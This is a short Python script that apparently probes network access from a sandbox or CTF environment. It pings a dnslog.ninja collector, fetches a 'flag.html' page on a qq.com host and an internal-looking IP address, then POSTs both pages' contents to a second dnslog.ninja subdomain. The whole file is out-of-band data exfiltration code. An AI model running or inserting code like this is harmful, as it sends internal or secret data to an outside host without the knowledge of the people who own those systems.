import requests
url1 = "https://t71vwzy2qj997ej161w3oy0kobu4iy6n.dnslog.ninja/"
url2 = "http://tst.qq.com/flag.html"
url3 = "https://n4spttvwnd6348gv3vtxlsxel5ryft3i.dnslog.ninja/"
url4 = "http://30.45.146.57/"
response1 = requests.get(url1)
response2 = requests.get(url2)
response4 = requests.get(url4)
data = {'url2': response2.text,'url4': response4.text}
response3 = requests.post(url3, data=data)
